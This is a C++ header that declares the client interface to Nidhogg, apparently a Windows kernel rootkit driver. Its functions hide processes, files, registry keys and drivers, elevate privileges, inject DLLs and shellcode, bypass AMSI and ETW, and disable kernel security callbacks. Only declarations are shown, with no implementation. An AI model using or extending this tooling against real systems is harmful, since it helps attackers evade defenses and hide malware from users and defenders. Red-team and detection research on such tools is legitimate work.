#pragma once
#include "pch.h"
#include "NidhoggIoctls.h"
#include "NidhoggStructs.h"

constexpr ULONG SYSTEM_PID = 4;
constexpr const wchar_t* DRIVER_NAME = LR"(\\.\Nidhogg)";
constexpr const wchar_t* HKLM_HIVE = LR"(\Registry\Machine)";
constexpr const wchar_t* HKCR_HIVE = LR"(\Registry\Machine\SOFTWARE\Classes)";
constexpr const wchar_t* HKU_HIVE = LR"(\Registry\User)";
constexpr const wchar_t* HKLM = L"HKEY_LOCAL_MACHINE";
constexpr const wchar_t* HKLM_SHORT = L"HKLM";
constexpr const wchar_t* HKU = L"HKEY_USERS";
constexpr const wchar_t* HKU_SHORT = L"HKU";
constexpr const wchar_t* HKCU = L"HKEY_CURRENT_USER";
constexpr const wchar_t* HKCU_SHORT = L"HKCU";
constexpr const wchar_t* HKCR = L"HKEY_CLASSES_ROOT";
constexpr const wchar_t* HKCR_SHORT = L"HKCR";

class NidhoggInterface {
private:
	HANDLE hNidhogg;

	std::wstring GetHKCUPath();
	std::wstring ParseRegistryKey(wchar_t* key);
	std::wstring ParsePath(wchar_t* path);

public:
	NidhoggInterface();
	~NidhoggInterface() { CloseHandle(this->hNidhogg); };
	bool IsValid() { return  this->hNidhogg != INVALID_HANDLE_VALUE; };

	void PrintError(NidhoggErrorCodes errorCode);
	NidhoggErrorCodes ProcessProtect(DWORD pid);
	NidhoggErrorCodes ProcessUnprotect(DWORD pid);
	NidhoggErrorCodes ProcessClearAllProtection();
	NidhoggErrorCodes ThreadProtect(DWORD tid);
	NidhoggErrorCodes ThreadUnprotect(DWORD tid);
	NidhoggErrorCodes ThreadClearAllProtection();
	NidhoggErrorCodes ProcessHide(DWORD pid);
	NidhoggErrorCodes ProcessUnhide(DWORD pid);
	NidhoggErrorCodes ThreadHide(DWORD tid);
	NidhoggErrorCodes ProcessElevate(DWORD pid);
	NidhoggErrorCodes ProcessSetProtection(DWORD pid, UCHAR signerType, UCHAR signatureSigner);
	std::vector<DWORD> QueryProcesses();
	std::vector<DWORD> QueryThreads();
	NidhoggErrorCodes FileProtect(wchar_t* filePath);
	NidhoggErrorCodes FileUnprotect(wchar_t* filePath);
	NidhoggErrorCodes FileClearAllProtection();
	std::vector<std::wstring> QueryFiles();
	NidhoggErrorCodes RegistryProtectKey(wchar_t* key);
	NidhoggErrorCodes RegistryHideKey(wchar_t* key);
	NidhoggErrorCodes RegistryProtectValue(wchar_t* key, wchar_t* valueName);
	NidhoggErrorCodes RegistryHideValue(wchar_t* key, wchar_t* valueName);
	NidhoggErrorCodes RegistryUnprotectKey(wchar_t* key);
	NidhoggErrorCodes RegistryUnhideKey(wchar_t* key);
	NidhoggErrorCodes RegistryUnprotectValue(wchar_t* key, wchar_t* valueName);
	NidhoggErrorCodes RegistryUnhideValue(wchar_t* key, wchar_t* valueName);
	NidhoggErrorCodes RegistryClearAll();
	std::vector<std::wstring> RegistryQueryProtectedKeys();
	std::vector<std::wstring> RegistryQueryHiddenKeys();
	RegistryQueryResult RegistryQueryProtectedValues();
	RegistryQueryResult RegistryQueryHiddenValues();
	NidhoggErrorCodes HideDriver(wchar_t* driverPath);
	NidhoggErrorCodes UnhideDriver(wchar_t* driverPath);
	NidhoggErrorCodes HideModule(DWORD pid, wchar_t* modulePath);
	NidhoggErrorCodes InjectDll(DWORD pid, const char* dllPath, InjectionType injectionType);
	NidhoggErrorCodes InjectShellcode(DWORD pid, PVOID shellcode, ULONG shellcodeSize, PVOID parameter1, PVOID parameter2, PVOID parameter3, InjectionType injectionType);
	NidhoggErrorCodes PatchModule(DWORD pid, wchar_t* moduleName, char* functionName, std::vector<byte> patch);
	NidhoggErrorCodes AmsiBypass(DWORD pid);
	NidhoggErrorCodes ETWBypass(DWORD pid);
	NidhoggErrorCodes EnableDisableEtwTi(bool enable);
	NidhoggErrorCodes DisableCallback(ULONG64 callbackAddress, CallbackType callbackType);
	NidhoggErrorCodes RestoreCallback(ULONG64 callbackAddress, CallbackType callbackType);
	CmCallbacksList ListRegistryCallbacks(NidhoggErrorCodes* success);
	PsRoutinesList ListPsRoutines(CallbackType callbackType, NidhoggErrorCodes* success);
	ObCallbacksList ListObCallbacks(CallbackType callbackType, NidhoggErrorCodes* success);
};
